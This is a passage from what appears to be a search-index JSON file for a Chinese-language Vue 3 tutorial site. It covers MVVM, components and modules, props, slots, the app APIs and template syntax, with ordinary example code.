MVVM\uff0c\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u524d\u7aef\u6240\u6709\u7684\u6846\u67b6\u51e0\u4e4e\u90fd\u7b26\u5408\u8be5\u6a21\u578b\uff0c\u5171\u5206\u4e3a\u4e09\u5c42\uff1a</p> <ul> <li>M\uff1aModel\uff0c\u5176\u5b9e\u5c31\u662f data()\u9009\u9879</li> <li>V\uff1aView\uff0c\u5c31\u662f\u5b9a\u4e49\u7684 html \u6a21\u677f\uff0c<code>&lt;template&gt;</code></li> <li>VM\uff1aViewModel\uff0c\u5c31\u662f vue \u5b9e\u4f8b\u5bf9\u8c61\u3002 <code>const vm = app.mount('#app')</code> \u3002</li> </ul>"},{"location":"web/vue/mvvm/#_2","title":"\u7ec4\u4ef6\u4e0e\u6a21\u5757","text":"<p>\u6a21\u5757 \u662f ES6 \u4e2d\u7684\u4e00\u4e2a\u6982\u5ff5\u3002\u6211\u4eec\u53ef\u4ee5\u5c06\u4e00\u4e2a\u590d\u6742\u7684\u63d0\u4f9b\u591a\u4e2a\u529f\u80fd(\u6253\u5370\u5b66\u751f\u4fe1\u606f\u3001\u6253\u5370\u8001\u5e08\u4fe1\u606f\uff09\u7684\u4e00\u4e2a js \u6587\u4ef6\uff0c\u62c6\u5206 \u6210\u591a\u4e2a\u63d0\u4f9b\u5355\u72ec\u529f\u80fd\u7684\u4fbf\u4e8e\u590d\u7528\u7684\u591a\u4e2a js \u6587\u4ef6\uff1a</p> <ul> <li>\u6253\u5370\u5b66\u751f\u4fe1\u606f.js</li> <li>\u6253\u5370\u8001\u5e08\u4fe1\u606f.js</li> </ul> <p>\u53ef\u4ee5\u91c7\u7528 ES6 \u63d0\u4f9b\u7684 <code>export</code> \u548c <code>import</code> \u6765\u5bfc\u51fa\u548c\u5bfc\u5165\u6a21\u5757\u3002</p> <p>\u7531\u6b64\u5f15\u51fa\u53e6\u4e00\u4e2a\u6982\u5ff5\uff0c\u5f53\u5e94\u7528\u4e2d\u7684 js \u90fd\u4ee5\u6a21\u5757\u6765\u7f16\u5199\uff0c\u90a3\u6211\u4eec\u79f0\u8fd9\u4e2a\u5e94\u7528\u662f <code>\u6a21\u5757\u5316</code> \u7684\u3002</p> <p>\u5728\u7ec4\u4ef6\u51fa\u73b0\u4e4b\u524d\u7684\u524d\u7aef\u7f16\u7a0b\uff0c\u6211\u4eec CSS \u548c JS \u4ee3\u7801\u7531\u4e8e\u53ef\u4ee5\u5728 HTML \u4e2d\u5bfc\u5165\uff0c\u56e0\u6b64\u90fd\u53ef\u4ee5\u5b9e\u73b0\u590d\u7528\uff0c\u4f46 HTML \u4ee3\u7801\u5c31\u65e0\u6cd5\u590d\u7528\u3002</p> <p>\u5047\u8bbe\u4e24\u4e2a\u9875\u9762\u90fd\u6709\u76f8\u540c\u7684 <code>header</code> \u548c <code>footer</code> \uff0c\u53ea\u80fd\u590d\u5236\uff0c\u800c\u4e0d\u80fd\u590d\u7528\u3002\u56e0\u4e3a HTML \u662f\u4e00\u4e2a\u6574\u4f53\uff0c\u65e0\u6cd5\u5206\u5272\u6210 HTML \u7247\u6bb5\u6765\u5bfc\u5165\u3002</p> <p>\u7ec4\u4ef6 \u6b63\u662f\u4e3a\u4e86\u89e3\u51b3\u4ee3\u7801\u7684\u590d\u7528\u7b49\u95ee\u9898\u800c\u51fa\u73b0\u7684\uff0c\u5b83\u662f\u7528\u6765\u5b9e\u73b0\u5c40\u90e8(\u7279\u5b9a)\u529f\u80fd\u6548\u679c\u7684\u4ee3\u7801\u96c6\u5408\uff0c\u4e00\u4e2a\u7ec4\u4ef6\u5305\u542b\uff1a</p> <ul> <li>HTML \u7247\u6bb5</li> <li>CSS</li> <li>JS</li> <li>Images</li> <li>...</li> </ul> <p>\u6ce8\u610f\uff0c\u6b64\u5904\u7684 HTML \u5e76\u4e0d\u662f\u4e00\u4e2a\u5b8c\u6574\u7684 HTML\uff0c\u5b83\u53ea\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u7247\u6bb5\u3002\u6bd4\u5982 <code>header.vue</code> \u7ec4\u4ef6\uff0c\u5176\u4e2d\u7684 HTML \u5c31\u53ea\u5305\u542b <code>header</code> \u7ec4\u4ef6\u7684 HTML\u3002</p> <p><code>\u7ec4\u4ef6\u5316</code> \u7c7b\u4f3c\u4e8e\u6a21\u5757\u5316\uff0c\u5f53\u5e94\u7528\u4e2d\u7684\u529f\u80fd\u90fd\u662f\u591a\u7ec4\u4ef6\u7684\u65b9\u5f0f\u6765\u7f16\u5199\u7684, \u90a3\u8fd9\u4e2a\u5e94\u7528\u5c31\u662f\u4e00\u4e2a\u7ec4\u4ef6\u5316\u7684\u5e94\u7528\u3002</p> <p>\u7ed3\u5408\u4e0a\u8ff0\u7684\u6982\u5ff5\uff0cVue \u4e2d\u7684\u4e00\u4e2a \u5355\u6587\u4ef6\u7ec4\u4ef6 <code>*.vue</code> \u9ed8\u8ba4\u6709\u4e09\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a</p> <ul> <li><code>&lt;template&gt;</code>\uff1aHTML \u7247\u6bb5</li> <li><code>&lt;script&gt;</code>\uff1a\u5b9a\u4e49\u7ec4\u4ef6\u7684 data\u3001method\u3001\u751f\u547d\u5468\u671f\u94a9\u5b50\u51fd\u6570\u7b49</li> <li><code>&lt;style lang=\u201dcss\u201d scoped&gt;</code>\uff1aCSS \u6837\u5f0f</li> <li><code>lang</code> \u4fee\u6539\u8bed\u8a00\uff0c\u5982 css\u3001scss\u3001less \u7b49\uff0c\u9ed8\u8ba4\u4e3a css\u3002\u82e5\u91c7\u7528\u5176\u4ed6\u8bed\u8a00\uff0c\u9700\u8981\u4e0b\u8f7d\u76f8\u5e94\u7684 loader\u3002\u6700\u7ec8\u90fd\u4f1a\u7f16\u8bd1\u6210 css\u3002</li> <li><code>scoped</code> \u7528\u4e8e\u9650\u5b9a\u8be5\u6837\u5f0f\u4ec5\u7528\u4e8e\u8be5\u7ec4\u4ef6\u3002\u82e5\u4e0d\u52a0 <code>scope</code> \uff0cvue \u4f1a\u5c06\u6240\u6709\u7ec4\u4ef6\u7684 style \u914d\u7f6e\u6e32\u67d3\u5230\u4e00\u8d77\uff0c\u5982\u679c\u4e24\u4e2a\u7ec4\u4ef6\u4e2d\u90fd\u7528\u7c7b\u9009\u62e9\u5668 <code>.test</code> \uff0c\u9009\u4e2d\u4e86 <code>class=\u201dtest\u201d</code> \u7684\u5bf9\u8c61 \uff0c\u5219\u4f1a\u51fa\u73b0\u51b2\u7a81\u3002\u56e0\u6b64\u4e00\u822c\u6211\u4eec\u90fd\u8981\u52a0\u4e0a <code>scoped</code> \u3002</li> </ul> <p>\u5f53\u7136\uff0c\u8fd8\u6709\u53ef\u9009\u7684\u9644\u52a0\u81ea\u5b9a\u4e49\u5757\uff0c\u8be6\u89c1\u5b98\u65b9\u6587\u6863\u3002</p> <p>\u5728 Vue \u4e2d\uff0c\u7ec4\u4ef6\u6587\u4ef6\u4e3b\u8981\u6709\u4e24\u79cd\uff1a</p> <ul> <li>\u5355\u6587\u4ef6\u7ec4\u4ef6\uff1a\u4ee5 <code>.vue</code> \u7ed3\u5c3e\u7684\u6587\u4ef6\uff0c\u5177\u4f53\u5f62\u5f0f\u5982\u4e0a\uff0c\u6307\u4e00\u4e2a\u6587\u4ef6\u4e2d\u4ec5\u542b\u6709\u4e00\u4e2a\u7ec4\u4ef6\u3002</li> <li>\u975e\u5355\u6587\u4ef6\u7ec4\u4ef6\uff1a\u4e00\u4e2a\u6587\u4ef6\u4e2d\u542b\u6709 n \u4e2a\u7ec4\u4ef6\u3002\u901a\u5e38\u76f4\u63a5\u5728\u4e00\u4e2a HTML \u6587\u4ef6\u91cc\u5199\u3002\u7ec4\u4ef6\u4e2d\u901a\u8fc7template\u9009\u9879\uff0c\u6dfb\u52a0\u5b57\u7b26\u4e32\u6a21\u677f\uff0c\u5b57\u7b26\u4e32\u6a21\u677f\u662f ES6 \u7684\u529f\u80fd\uff0c\u7528\u4e24\u4e2a\u53cd\u5f15\u53f7 `` \u5305\u88f9\u3002</li> </ul> <p>\u5728\u4f7f\u7528\u811a\u624b\u67b6 Vue CLI \u5f00\u53d1\u65f6\uff0c\u4f7f\u7528\u5355\u6587\u4ef6\u7ec4\u4ef6\u5f62\u5f0f\u3002</p>"},{"location":"web/vue/mvvm/#_3","title":"\u7ec4\u4ef6","text":""},{"location":"web/vue/mvvm/#props","title":"\u53c2\u6570 props","text":"<p>\u5047\u8bbe\u6709\u4e24\u4e2a\u5355\u6587\u4ef6\u7ec4\u4ef6\uff1a</p> <ul> <li>Content.vue\uff1a\u7236\u7ec4\u4ef6\uff0cStudent.vue \u5728\u5176\u4e2d\u5c40\u90e8\u6ce8\u518c\u3002</li> <li>Student.vue\uff1a\u5b50\u7ec4\u4ef6</li> </ul> <p>\u6b64\u65f6\uff0c\u7236\u7ec4\u4ef6\u5c31\u53ef\u4ee5\u5411\u5b50\u7ec4\u4ef6\u4f20\u9012\u53c2\u6570\uff1a</p> <ul> <li>\u9759\u6001\u4f20\u9012\uff1a<code>age=\"\"</code></li> <li>\u52a8\u6001\u4f20\u9012\uff1a<code>v-bind:age=\"\"</code></li> </ul> Content.vue<pre><code>&lt;template&gt;\n    &lt;div&gt;\n        &lt;Student name=\"\u738b\u4e50\u537f\" :age=\"1+1\"&gt;&lt;/Student&gt;\n    &lt;/div&gt;\n&lt;/template&gt;\n&lt;script&gt;\n    export default{\n        name:'Content',\n      components:{\n        Student\n      }\n}\n&lt;/script&gt;\n</code></pre> <p>\u540c\u6837\uff0c\u5b50\u7ec4\u4ef6\u9700\u8981\u8bf4\u660e\u63a5\u53d7\u54ea\u4e9b\u53c2\u6570\uff0c\u901a\u8fc7 props \u9009\u9879\u914d\u7f6e\uff0c\u5171\u6709\u4e24\u79cd\uff1a</p> <ul> <li>\u6570\u7ec4 props\uff1a\u4ec5\u4ec5\u63a5\u53d7\u6570\u636e\u3002</li> <li>\u5bf9\u8c61 props\uff1a\u5728\u63a5\u53d7\u53c2\u6570\u7684\u540c\u65f6\uff0c\u8fdb\u884c\u6570\u636e\u9a8c\u8bc1\uff0c\u5982\u7c7b\u578b\u68c0\u67e5\u3002</li> </ul> Steudent.vue<pre><code>&lt;template&gt;\n   ...\n&lt;/template&gt;\n&lt;script&gt;\n    export default{\n        name:'Student',\n        /* \u65b9\u6cd5\u4e00\uff1a\u6570\u7ec4\u7c7b\u578b */\n        props:[\"name\",\"age\"],\n\n        /* \u65b9\u6cd5\u4e8c\uff1a\u5bf9\u8c61\u7c7b\u578b */\n        props:{\n        // \u57fa\u7840\u7684\u7c7b\u578b\u68c0\u67e5 (`null` \u548c `undefined` \u503c\u4f1a\u901a\u8fc7\u4efb\u4f55\u7c7b\u578b\u9a8c\u8bc1)\n    propA: Number,\n    // \u591a\u4e2a\u53ef\u80fd\u7684\u7c7b\u578b\n    propB: [String, Number],\n    // \u5fc5\u586b\u7684\u5b57\u7b26\u4e32\n    propC: {\n      type: String,\n      required: true\n    },\n    // \u5e26\u6709\u9ed8\u8ba4\u503c\u7684\u6570\u5b57\n    propD: {\n      type: Number,\n      default: 100\n    },\n    // \u5e26\u6709\u9ed8\u8ba4\u503c\u7684\u5bf9\u8c61\n    propE: {\n      type: Object,\n      // \u5bf9\u8c61\u6216\u6570\u7ec4\u7684\u9ed8\u8ba4\u503c\u5fc5\u987b\u4ece\u4e00\u4e2a\u5de5\u5382\u51fd\u6570\u8fd4\u56de\n      default() {\n        return { message: 'hello' }\n      }\n    }\n    }\n        setup(props){...}\n\n}\n&lt;/script&gt;\n</code></pre>"},{"location":"web/vue/mvvm/#slot","title":"\u63d2\u69fd slot","text":"<p>\u76ee\u524d\u7236\u7ec4\u4ef6\u53ef\u4ee5\u4f20\u9012\u53c2\u6570\u7ed9\u5b50\u7ec4\u4ef6\uff0c\u4f46\u662f\u65e0\u6cd5\u4f20\u9012\u8bf8\u5982 <code>&lt;img ...&gt;</code> \u7ed9\u5b50\u7ec4\u4ef6\u3002\u63d2\u69fd\u5c31\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u6837\u7684\u529f\u80fd\u3002</p> <p>\u9996\u5148\u9700\u8981\u5728\u5b50\u7ec4\u4ef6\u4e2d\u6316\u5751\uff1a</p> Steudent.vue<pre><code>&lt;template&gt;\n  &lt;div&gt;\n    &lt;slot&gt;&lt;/slot&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n</code></pre> <p>\u7136\u540e\u5f53\u7236\u7ec4\u4ef6\u4f7f\u7528\u5b50\u7ec4\u4ef6\u65f6\uff0c\u4f20\u5165\u7684\u5185\u5bb9\u5c31\u4f1a\u663e\u793a\u5728 <code>&lt;slot&gt;</code> \u7684\u4f4d\u7f6e\u3002</p> Content.vue<pre><code>&lt;template&gt;\n    &lt;div&gt;\n        &lt;Student&gt;\n                &lt;img ...&gt;&lt;/img&gt;\n                \u8fd9\u91cc\u7684\u5185\u5bb9\u90fd\u4f1a\u52a0\u5230\u63d2\u69fd\u4e2d\n        &lt;/Student&gt;\n    &lt;/div&gt;\n&lt;/template&gt;\n&lt;script&gt;\n    export default{\n        name:'Content',\n      components:{\n        Student\n      }\n}\n&lt;/script&gt;\n</code></pre> <p>\u9664\u4e86\u4e0a\u8ff0\u7684\u666e\u901a\u63d2\u69fd\uff0c\u8fd8\u6709\u5177\u540d\u63d2\u69fd\u548c\u4f5c\u7528\u57df\u63d2\u69fd\u3002</p> <p>\u4e0b\u8ff0\u662f\u5177\u540d\u63d2\u69fd\uff0c\u901a\u8fc7 <code>name</code> \u4e3a\u63d2\u69fd\u63d0\u4f9b\u4e00\u4e2a\u540d\u5b57\uff0c\u7136\u540e\u5728\u7236\u7ec4\u4ef6\u4e2d\u4f7f\u7528 <code>v-slot</code> \u6765\u6307\u5b9a\u5c06\u54ea\u4e9b\u5185\u5bb9\u653e\u5230\u6307\u5b9a <code>name</code> \u7684\u63d2\u69fd\u4e2d\u3002</p> <p>\u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u8f83\u4e3a\u91cd\u8981\u7684\u6807\u7b7e <code>&lt;template&gt;</code> \uff0c\u5728\u6b64\u4e4b\u524d\uff0c\u8fd9\u4e2a\u6807\u7b7e\u662f\u5355\u6587\u4ef6\u7ec4\u4ef6\u4e2d\u90fd\u4f1a\u4f7f\u7528\u7684\u4e00\u4e2a\u6807\u7b7e\u3002\u4f46\u5b9e\u9645\u4e0a\uff0c\u8fd9\u4e2a\u6807\u7b7e\u5728\u6700\u5916\u90e8\u7684 <code>&lt;template&gt;</code> \u6807\u7b7e\u4e4b\u5185\u8fd8\u80fd\u4f7f\u7528\uff0c\u5b83\u552f\u4e00\u7684\u4f5c\u7528\u7684\u5c06\u4e00\u4e9b\u5185\u5bb9\u5305\u88f9\u8d77\u6765\uff0c\u4f46\u6700\u540e\u6e32\u67d3\u751f\u6210\u7684 DOM \u4e2d\uff0c\u5b8c\u5168\u4e0d\u4f1a\u5b58\u5728\u8fd9\u4e2a\u6807\u7b7e\u3002</p> <pre><code>// \u5b50\u7ec4\u4ef6\u63d0\u4f9b\u5177\u540d\u63d2\u69fd\n&lt;template&gt;\n    &lt;div class=\"container\"&gt;\n      &lt;header&gt;\n        &lt;slot name=\"header\"&gt;&lt;/slot&gt;\n      &lt;/header&gt;\n      &lt;main&gt;\n        &lt;slot&gt;&lt;/slot&gt;\n      &lt;/main&gt;\n      &lt;footer&gt;\n        &lt;slot name=\"footer\"&gt;&lt;/slot&gt;\n      &lt;/footer&gt;\n    &lt;/div&gt;\n&lt;/template&gt;\n\n// \u7236\u7ec4\u4ef6\n&lt;template&gt;\n    &lt;base-layout&gt;\n      &lt;template v-slot:header&gt;\n        &lt;h1&gt;Here might be a page title&lt;/h1&gt;\n      &lt;/template&gt;\n\n      &lt;template v-slot:default&gt;\n        &lt;p&gt;A paragraph for the main content.&lt;/p&gt;\n        &lt;p&gt;And another one.&lt;/p&gt;\n      &lt;/template&gt;\n\n      &lt;template v-slot:footer&gt;\n        &lt;p&gt;Here's some contact info&lt;/p&gt;\n      &lt;/template&gt;\n    &lt;/base-layout&gt;\n&lt;/template&gt;\n</code></pre> <p>\u6700\u540e\u7684\u4f5c\u7528\u57df\u6807\u7b7e\uff0c\u5b83\u53ef\u4ee5\u8ba9\u63d2\u69fd\u5185\u5bb9\u80fd\u591f\u8bbf\u95ee\u5b50\u7ec4\u4ef6\u4e2d\u624d\u6709\u7684\u6570\u636e\u3002\u53c2\u89c1</p>"},{"location":"web/vue/mvvm/#_4","title":"\u5e94\u7528","text":"<p>\u6bcf\u4e2a Vue \u5e94\u7528\u90fd\u662f\u901a\u8fc7\u4e00\u4e2a\u5168\u5c40 API <code>createApp</code>\u00a0 \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 **\u5e94\u7528\u5b9e\u4f8b**\u5f00\u59cb\u7684\uff0c\u8be5\u65b9\u6cd5\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\uff1a</p> <ul> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a\u6839\u7ec4\u4ef6\u9009\u9879\u5bf9\u8c61\u3002\u5f53\u6211\u4eec\u6302\u8f7d\u5e94\u7528\u65f6\uff0c\u8be5\u7ec4\u4ef6\u4f5c\u4e3a\u6e32\u67d3\u7684\u8d77\u70b9</li> <li>\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1a\u5c06\u6839 prop \u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f</li> </ul> <pre><code>import { createApp } from 'vue'\n// \u6839\u7ec4\u4ef6\u9009\u9879\u5bf9\u8c61\nconst RootComponent = {\n    props:['age'],\n  data() {\n    return {\n      ...\n    }\n  },\n  methods: {...},\n  computed: {...}\n  ...\n}\nconst props = {\n    age:12\n}\nconst app = Vue.createApp(RootComponent,props)\n</code></pre> <p>vue \u5e94\u7528\u6709\u5982\u4e0b\u56db\u4e2a\u5e38\u7528\u7684\u5e94\u7528 API\uff1acomponent()\u3001directive()\u3001use()\u3001mount()\u3002</p> <p>\u5176\u4e2d\u524d\u4e09\u4e2a\u65b9\u6cd5\u90fd\u8fd4\u56de <code>vue\u5e94\u7528 app</code> \uff0c\u56e0\u6b64\u53ef\u4ee5\u94fe\u5f0f\u8c03\u7528\uff1a</p> <pre><code>Vue.createApp({})\n  .component(\"RootComponent\", RootComponent)\n  .directive(\"focus\", FocusDirective)\n  .use(router);\n</code></pre> <p>\u2460component()</p> <p>component \u7528\u4e8e\u5411 vue \u5e94\u7528\u6ce8\u518c \u5168\u5c40\u7ec4\u4ef6 \uff0c\u5168\u5c40\u6ce8\u518c\u7684\u7ec4\u4ef6\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff0c\u65e0\u9700\u518d\u6b21\u5bfc\u5165\u3002</p> <p>\u2461directive()</p> <p>\u6ce8\u518c\u5168\u5c40\u81ea\u5b9a\u4e49\u6307\u4ee4\u3002</p> <p>\u5df2\u77e5\u6709\u5185\u7f6e\u6307\u4ee4\uff0c\u8bf8\u5982 <code>v-bind</code>\u3001<code>v-on</code>\u3002\u8fd9\u4e9b\u81ea\u5b9a\u4e49\u6307\u4ee4\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5bf9 DOM \u8fdb\u884c\u5904\u7406\u3002</p> <p>\u5f53\u7136\uff0c\u6709\u4e9b\u5bf9 DOM \u7684\u64cd\u4f5c\u53ef\u80fd\u5185\u7f6e\u6307\u4ee4\u65e0\u6cd5\u6ee1\u8db3\uff0c\u56e0\u6b64 vue \u5141\u8bb8\u6211\u4eec\u5b9a\u4e49\u81ea\u5b9a\u4e49\u6307\u4ee4\u3002</p> <p>\u2462use()</p> <p>use \u7528\u4e8e\u5b89\u88c5 Vue.js <code>\u63d2\u4ef6</code> \uff0c\u5982\u679c\u63d2\u4ef6\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5219\u5b83\u5fc5\u987b\u66b4\u9732\u4e00\u4e2a \u00a0<code>install</code>\u00a0 \u65b9\u6cd5\u3002\u5982\u679c\u63d2\u4ef6\u672c\u8eab\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5219\u5b83\u5c06\u88ab\u89c6\u4e3a \u00a0<code>install</code>\u00a0 \u65b9\u6cd5\u3002</p> <p>\u63d2\u4ef6\u7528\u4e8e\u589e\u5f3a vue\uff0c\u5b98\u65b9\u7684\u63d2\u4ef6\u6709\uff1a</p> <ul> <li>VueX\uff1ause(store)</li> <li>Vue Router\uff1ause(router)</li> </ul> <p>\u5f53\u7136\u4e5f\u53ef\u4ee5\u81ea\u5b9a\u4e49\u63d2\u4ef6\uff0c\u901a\u5e38\u5c06\u63d2\u4ef6\u653e\u7f6e\u4e8e <code>pluins</code> \u6587\u4ef6\u5939\u4e0b\u3002</p> <p>\u2463mount()</p> <p>\u4e00\u4e2a vue \u5e94\u7528\u9700\u8981\u88ab\u6302\u8f7d\u5230\u4e00\u4e2a DOM \u5143\u7d20\u4e2d\uff0c\u4f8b\u5982\uff0c\u5982\u679c\u4f60\u60f3\u628a\u4e00\u4e2a Vue \u5e94\u7528\u6302\u8f7d\u5230 \u00a0<code>&lt;div id=\"app\"&gt;&lt;/div&gt;</code>\uff0c\u5e94\u8be5\u4f20\u5165 \u00a0<code>#app</code>\uff1a</p> <pre><code>const vm = app.mount(\"#app\");\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cmount()\u7684\u65b9\u6cd5\u8fd4\u56de\u7684\u4e0d\u662f vue \u5bf9\u8c61\uff0c\u800c\u662f <code>\u7ec4\u4ef6\u5b9e\u4f8bvm</code> \u3002</p> <p>\u6ce8\u610f\uff0c\u6839\u7ec4\u4ef6\u548c\u5176\u4f59\u7ec4\u4ef6\u5e76\u65e0\u4e0d\u540c\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5982\u4e0b\u516d\u4e2a\u5e94\u7528 API\uff1amixin\u3001version\u3001unmount\u3001config\u3001provide\u3002</p> <ul> <li>mixin\uff1avue \u5b98\u7f51**\u4e0d\u5efa\u8bae\u5728\u5e94\u7528\u4ee3\u7801\u4e2d\u4f7f\u7528\u3002**</li> <li>version\uff1a\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u63d0\u4f9b\u5df2\u5b89\u88c5\u7684 Vue \u7684\u7248\u672c\u53f7</li> <li>unmount\uff1a\u5378\u8f7d\u5e94\u7528\u5b9e\u4f8b\u7684\u6839\u7ec4\u4ef6\u3002</li> <li>config\uff1a\u4e00\u4e2a\u5305\u542b\u5e94\u7528\u914d\u7f6e\u7684\u5bf9\u8c61 | \u5e94\u7528\u914d\u7f6e</li> </ul>"},{"location":"web/vue/mvvm/#_5","title":"\u5168\u5c40\u6ce8\u518c","text":"<p>\u5168\u5c40\u6ce8\u518c\u548c\u5c40\u90e8\u6ce8\u518c\u4e3b\u8981\u4f53\u73b0\u5728\u7ec4\u4ef6\u548c\u6307\u4ee4\u4e0a\u3002</p> <ul> <li>\u4f7f\u7528 <code>app.component</code> \u521b\u5efa\u7684\u7ec4\u4ef6\u662f\u5168\u5c40\u6ce8\u518c\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b83\u4eec\u5728\u6ce8\u518c\u4e4b\u540e\u53ef\u4ee5\u7528\u5728\u4efb\u4f55\u65b0\u521b\u5efa\u7684\u7ec4\u4ef6\u5b9e\u4f8b\u7684\u6a21\u677f\u4e2d\u3002</li> <li>\u4f7f\u7528 <code>app.directive</code> \u521b\u5efa\u7684\u6307\u4ee4\u4e5f\u662f\u5168\u5c40\u6ce8\u518c\u7684\u3002</li> </ul>"},{"location":"web/vue/mvvm/#_6","title":"\u5c40\u90e8\u6ce8\u518c","text":"<p>\u5982\u679c\u4f7f\u7528\u4e86\u8bf8\u5982 Babel \u548c webpack \u7684\u6a21\u5757\u7cfb\u7edf\uff0c\u63a8\u8350\u521b\u5efa\u4e00\u4e2a \u00a0<code>components</code>\u00a0 \u76ee\u5f55\uff0c\u5e76\u5c06\u6bcf\u4e2a\u7ec4\u4ef6\u653e\u7f6e\u5728\u5176\u5404\u81ea\u7684\u6587\u4ef6\u4e2d\u3002</p> <p>\u7136\u540e\u5728\u5c40\u90e8\u6ce8\u518c\u4e4b\u524d\u5bfc\u5165\u6bcf\u4e2a\u4f60\u60f3\u4f7f\u7528\u7684\u7ec4\u4ef6\u3002</p> <ul> <li>\u4f7f\u7528 <code>components</code> \u6ce8\u518c\u5c40\u90e8\u7ec4\u4ef6</li> <li>\u4f7f\u7528 <code>directives</code> \u6ce8\u518c\u5c40\u90e8\u6307\u4ee4\uff0c\u6ce8\u610f\u4f7f\u7528\u65f6\u9700\u8981\u52a0\u4e0a\u524d\u7f00 <code>v-</code> \uff0c\u4f46\u547d\u540d\u65f6\u65e0\u9700\u6dfb\u52a0\u3002</li> </ul> <pre><code>// ComponentB\n&lt;template&gt;\n  &lt;div class=\"home\"&gt;\n    &lt;ComponentA/&gt;\n        &lt;ComponentB/&gt;\n        &lt;input v-focus&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nimport ComponentA from './ComponentA'\nimport ComponentC from './ComponentC'\n\nexport default {\n  components: {\n    ComponentA,\n    ComponentC\n  }\n    directives: {\n    focus: {\n      mounted(el) {\n        el.focus()\n      }\n    }\n  }\n}\n&lt;/script&gt;\n</code></pre> <p>\u5982\u4e0a\uff0c\u5c31\u5728 ComponentB \u6587\u4ef6\u4e2d\u5c40\u90e8\u6ce8\u518c\u4e86 ComponentA \u548c ComponentC\uff0c\u5e76\u4e14\u5728 ComponentB \u7684\u6a21\u677f template \u4e2d\u4f7f\u7528\u4e86\u8fd9\u4e24\u4e2a\u7ec4\u4ef6\u3002</p> <p>\u540c\u65f6\uff0c\u58f0\u660e\u4e86\u4e00\u7ec4\u53ef\u7528\u4e8e\u7ec4\u4ef6\u5b9e\u4f8b\u4e2d\u7684\u6307\u4ee4 focus\uff0c\u5e76\u4e14\u5728 template \u4e2d\u4f7f\u7528\u4e86\u81ea\u5b9a\u4e49\u7684 <code>v-focus</code> \u6307\u4ee4\u3002</p>"},{"location":"web/vue/mvvm/#property","title":"\u5b9e\u4f8b property","text":"<p>Vue \u8fd8\u901a\u8fc7\u7ec4\u4ef6\u5b9e\u4f8b\u66b4\u9732\u4e86\u4e00\u4e9b\u5185\u7f6e property\uff0c\u5982 \u00a0<code>$data</code>\u00a0 \u548c \u00a0<code>$emit</code> \u7b49\u3002\u8fd9\u4e9b property \u90fd\u6709\u4e00\u4e2a \u00a0<code>$</code>\u00a0 \u524d\u7f00\uff0c\u4ee5\u907f\u514d\u4e0e\u7528\u6237\u5b9a\u4e49\u7684 property \u540d\u51b2\u7a81\u3002</p> <p>\u53c2\u89c1\uff1aVue3 | \u5b9e\u4f8b property</p>"},{"location":"web/vue/mvvm/#_7","title":"\u6a21\u677f\u8bed\u6cd5","text":"<p>vue \u7684\u6a21\u677f\u8bed\u6cd5\u6709\u4e24\u7c7b\uff1a</p> <ul> <li>\u63d2\u503c\u8bed\u6cd5\uff1a{{ ... }}\uff0c\u7528\u4e8e\u89e3\u6790\u6807\u7b7e\u4f53\u5185\u5bb9\u3002\u53cc\u62ec\u53f7\u5185\u7684\u4f1a\u4f5c\u4e3a js \u8868\u8fbe\u5f0f\u89e3\u6790\uff0c\u610f\u5473\u7740\u91cc\u9762\u53ef\u4ee5\u5199 js \u4ee3\u7801\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 data()\u4e2d\u5b9a\u4e49\u7684\u53d8\u91cf\u3002</li> <li>\u6307\u4ee4\u8bed\u6cd5\uff1a\u5982 v-bind\uff0c\u7528\u4e8e\u89e3\u6790\u6807\u7b7e\uff0c\u5305\u62ec\u6807\u7b7e\u5c5e\u6027\u3001\u6807\u7b7e\u4f53\u5185\u5bb9\u3001\u7ed1\u5b9a\u4e8b\u4ef6\u7b49\u3002\u6b64\u5916\uff0c\u5982 <code>v-bind:href=\" ... \"</code> \u7684\u5f62\u5f0f\uff0c\u6b64\u5904\u7684 <code>\" ... \"</code> \u4e2d\u7684\u5185\u5bb9\u4e5f\u4f1a\u4f5c\u4e3a js \u8868\u8fbe\u5f0f\u89e3\u6790\u3002</li> </ul> <pre><code>&lt;div&gt;\n&lt;a v-bind:href=\"url\"&gt;{{name}}&lt;/a&gt;\n&lt;/div&gt;\n\ndata(){\n    return {\n        url:\"www.leqing.online\"\n        name:\"\u4e50\u4e50\u535a\u5ba2\"\n    }\n}\n</code></pre> <p>\u652f\u6301\u7684 js \u683c\u5f0f\uff1a</p> <pre><code>{\n  {\n    number + 1;\n  }\n}\n\n{\n  {\n    ok ? \"YES\" : \"NO\";\n  }\n}\n\n{\n  {\n    message.split(\"\").reverse().join(\"\");\n  }\n}\n\n&lt;div v-bind:id=\"'list-' + id\"&gt;&lt;/div&gt;;\n</code></pre>"}]}